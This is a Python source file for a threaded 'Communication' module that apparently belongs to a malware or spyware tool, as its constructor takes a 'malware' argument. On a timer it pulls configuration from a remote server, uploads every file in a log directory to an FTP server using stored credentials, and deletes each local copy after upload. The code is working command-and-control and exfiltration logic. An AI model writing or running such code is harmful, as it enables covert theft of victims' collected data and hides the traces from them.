from Configuration import Configuration
from Util import Util
from threading import Thread
from time import sleep
from requests import get
from json import loads, dumps
from shutil import copy, copy2
from ftplib import FTP
import os


class Communication(Thread):

    def __init__(self, malware, config:Configuration):
        Thread.__init__(self, name='communication')
        self.__config = config


    def run(self):
        while True:
            sleep(self.__config.communicationFrequency)
            self.getConfigFromServer()
            self.uploadFilesFTP()


    def getConfigFromServer(self):
        if self.__config.debug:
            print('Connecting to the server...')
        try:
            response = get(url=self.__config.baseURL, params={'username':self.__config.userName})
            data = response.json()
            if data:
                jsonData = dumps(data, ensure_ascii=False)
                Util.fileOut(self.__config.logPath + 'config.json', jsonData, 'w')
                if self.__config.debug:
                    print('Config file has been created!')
                self.__config.setAttributes()
        except Exception as exception:
            print(f'COMMUNICATION ERROR!: {exception}')


    def uploadFilesFTP(self):
        try:
            ftp = FTP(self.__config.ftpURL)
            ftp.login(self.__config.ftpUserName, self.__config.ftpPassword)
            for root, dirs, files in os.walk(self.__config.logPath):
                for filename in files:
                    with open(root + filename,'rb') as FILE:
                        ftp.storbinary(f'STOR {filename}', FILE)
                    os.remove(root + filename)          
            ftp.quit()
            print('FTP upload successfully finished!')
        except Exception as exception:
            print(f'COMMUNICATION ERROR!: {exception}')

